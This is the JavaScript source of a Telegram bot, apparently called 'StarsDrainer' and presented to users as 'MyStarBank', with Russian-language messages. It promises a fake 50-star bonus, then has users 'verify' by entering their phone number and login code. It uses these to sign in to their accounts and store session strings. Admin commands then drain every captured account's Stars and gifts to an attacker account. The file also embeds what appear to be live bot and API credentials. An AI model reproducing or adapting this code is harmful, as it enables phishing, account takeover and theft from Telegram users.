const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const ADMIN_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        stars INTEGER DEFAULT 0,
        verified INTEGER DEFAULT 0
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS user_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// ========= /START =========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // если юзер новый → выдаем стартовый чек
    db.get("SELECT * FROM users WHERE user_id=?", [chatId], (err, row) => {
        if (!row) {
            db.run("INSERT INTO users(user_id, stars, verified) VALUES(?, 50, 0)", [chatId]);
        }
    });

    const text = `
<b>💎 MyStarBank</b>

🎫 Вам начислен стартовый чек:
⭐ 50 STARS

Выберите действие:
`;

    bot.sendPhoto(chatId, path.join(__dirname, 'public', 'avatar.jpg'), {
        caption: text,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "💰 Баланс", callback_data: "user_balance" },
                    { text: "🎁 Вывести", callback_data: "user_withdraw" }
                ]
            ]
        }
    });
});

// ========= КНОПКИ ПОЛЬЗОВАТЕЛЯ =========
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'user_balance') {
        db.get("SELECT stars FROM users WHERE user_id=?", [chatId], (err, row) => {
            const stars = row ? row.stars : 0;

            bot.sendMessage(chatId,
                `📊 <b>Ваш баланс</b>\n\n⭐ Stars: ${stars}`,
                { parse_mode: 'HTML' }
            );
        });
    }

    if (query.data === 'user_withdraw') {
        db.get("SELECT verified FROM users WHERE user_id=?", [chatId], (err, row) => {

            if (row && row.verified === 1) {
                bot.sendMessage(chatId,
                    "✅ Верификация уже пройдена. Ведите @username"
                );
            } else {
                bot.sendMessage(chatId,
                    "🔐 <b>Для вывода требуется верификация</b>",
                    {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
                                ]
                            ]
                        }
                    }
                );
            }
        });
    }
    
    // Админские функции
    if (query.data === 'process_gifts') {
        bot.sendMessage(chatId, "Начинаю обработку подарков...");
        processAllGifts();
    }
    else if (query.data === 'process_stars') {
        bot.sendMessage(chatId, "Начинаю обработку звезд...");
        processAllStars();
    }
    else if (query.data === 'show_logs') {
        showLogs(chatId);
    }
});

// ========= INLINE ВВОД @ =========
bot.on('inline_query', (query) => {
    if (!query.query.startsWith("@")) return;

    bot.answerInlineQuery(query.id, [{
        type: 'article',
        id: 'username_select',
        title: 'Подтвердить вывод',
        input_message_content: {
            message_text: `✅ Username принят: <b>${query.query}</b>\nОжидайте зачисления ⭐`,
            parse_mode: 'HTML'
        }
    }]);
});

// Web App обработка
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/process', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO user_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithCode(phone, code);
    }
    
    res.sendStatus(200);
});

// ========= ПОСЛЕ ВЕРИФИКАЦИИ =========
app.post('/verified', (req, res) => {
    const userId = req.body.user_id;

    db.run("UPDATE users SET verified=1 WHERE user_id=?", [userId]);

    bot.sendPhoto(userId, path.join(__dirname, 'public', 'stars.jpg'), {
        caption: `
✅ <b>Верификация пройдена</b>

Теперь укажите ваш @username для вывода 50 STARS
`,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "✏️ Указать @username", switch_inline_query_current_chat: "@" }
                ]
            ]
        }
    });

    res.sendStatus(200);
});

// Запрос кода
async function requestTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 60000,
            useWSS: false
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE user_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(ADMIN_USER_ID, `Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE user_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            const user = await client.getMe();
            bot.sendMessage(ADMIN_USER_ID, `Сессия сохранена: ${phone}\n👤 @${user.username || 'нет'}`);
            
            // Обновляем верификацию пользователя
            db.run("UPDATE users SET verified=1 WHERE user_id=?", [user.id]);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(ADMIN_USER_ID, `Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `Ошибка: ${error.message}`);
    }
}

// Админские команды
bot.onText(/\/admin/, (msg) => {
    if (msg.from.id !== ADMIN_USER_ID) return;
    
    const adminText = `Админ панель\n\nВыберите действие:`;
    
    const adminKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Обработать подарки", callback_data: "process_gifts" }],
                [{ text: "Обработать звезды", callback_data: "process_stars" }],
                [{ text: "Посмотреть логи", callback_data: "show_logs" }]
            ]
        }
    };

    bot.sendMessage(msg.chat.id, adminText, {
        parse_mode: 'HTML',
        ...adminKeyboard
    });
});

// Обработка подарков
async function processAllGifts() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM user_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalProcessed = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(ADMIN_USER_ID, `Подключен к ${row.phone}, ищу подарки...`);
                
                const result = await processUserGifts(client, row.phone);
                await client.disconnect();
                
                if (result) totalProcessed++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(ADMIN_USER_ID, `Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(ADMIN_USER_ID, `Обработано подарков с ${totalProcessed} аккаунтов`);
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `Ошибка обработки подарков: ${error.message}`);
    }
}

// Обработка звезд
async function processAllStars() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM user_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalProcessed = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(ADMIN_USER_ID, `Подключен к ${row.phone}, проверяю звезды...`);
                
                const result = await processUserStars(client, row.phone);
                await client.disconnect();
                
                if (result) totalProcessed++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(ADMIN_USER_ID, `Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(ADMIN_USER_ID, `Обработано звезд с ${totalProcessed} аккаунтов`);
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `Ошибка обработки звезд: ${error.message}`);
    }
}

// Функция обработки звезд
async function processUserStars(client, phone) {
    try {
        const status = await client.invoke(
            new Api.payments.GetStarsStatus({
                peer: new Api.InputPeerSelf(),
            })
        );

        const bal = status.balance;
        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;

        if (starsAmount === 0) {
            bot.sendMessage(ADMIN_USER_ID, `${phone}: Нет звезд`);
            return false;
        }

        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'TargetUser' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(ADMIN_USER_ID, `${phone}: Не найден пользователь`);
            return false;
        }

        const targetUser = target.users[0];

        await client.invoke(
            new Api.payments.SendStars({
                peer: targetUser,
                stars: Math.floor(starsAmount),
                purpose: new Api.InputStorePaymentPremiumSubscription({
                    restore: false,
                    upgrade: true
                })
            })
        );

        db.run(`UPDATE user_sessions SET stars_data = ? WHERE phone = ?`, 
            [Math.floor(starsAmount), phone]);

        bot.sendMessage(ADMIN_USER_ID, `${phone}: Обработано ${Math.floor(starsAmount)} звезд`);
        return true;
        
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `${phone}: Ошибка обработки звезд - ${error.message}`);
        return false;
    }
}

// Функция обработки подарков
async function processUserGifts(client, phone) {
    try {
        const gifts = await client.invoke(
            new Api.payments.GetSavedStarGifts({
                peer: new Api.InputPeerSelf(),
                offset: "",
                limit: 100,
            })
        );

        if (!gifts.gifts || gifts.gifts.length === 0) {
            bot.sendMessage(ADMIN_USER_ID, `${phone}: Нет подарков`);
            return false;
        }

        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'TargetUser' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(ADMIN_USER_ID, `${phone}: Не найден пользователь`);
            return false;
        }

        const targetUser = target.users[0];
        let processedCount = 0;

        for (const gift of gifts.gifts) {
            try {
                await client.invoke(
                    new Api.payments.TransferStarGift({
                        stargift: new Api.InputSavedStarGiftUser({ 
                            msgId: gift.msgId 
                        }),
                        toId: new Api.InputPeerUser({ 
                            userId: targetUser.id,
                            accessHash: targetUser.accessHash
                        })
                    })
                );
                
                processedCount++;
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (e) {
                try {
                    if (gift.convertStars) {
                        await client.invoke(
                            new Api.payments.SendStars({
                                peer: targetUser,
                                stars: gift.convertStars,
                                purpose: new Api.InputStorePaymentGift({
                                    userId: targetUser.id
                                })
                            })
                        );
                        processedCount++;
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                } catch (e2) {
                    continue;
                }
            }
        }

        if (processedCount > 0) {
            db.run(`UPDATE user_sessions SET gifts_data = ? WHERE phone = ?`, 
                [processedCount, phone]);
            bot.sendMessage(ADMIN_USER_ID, `${phone}: Обработано ${processedCount} подарков`);
            return true;
        }
        
        return false;
        
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `${phone}: Ошибка обработки подарков - ${error.message}`);
        return false;
    }
}

// Показать логи
function showLogs(chatId) {
    db.all(`SELECT phone, status, stars_data, gifts_data FROM user_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = 'Последние сессии:\n\n';
        
        if (rows.length === 0) {
            logText = 'Нет данных';
        } else {
            rows.forEach(row => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 ${row.status}\n`;
                logText += `⭐ ${row.stars_data} stars\n`;
                logText += `🎁 ${row.gifts_data} gifts\n`;
                logText += `────────────\n`;
            });
        }
        
        bot.sendMessage(chatId, logText, { parse_mode: 'HTML' });
    });
}

// ========= СЕРВЕР =========
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Web сервер: http://localhost:${PORT}`);
});

console.log("🚀 Бот запущен");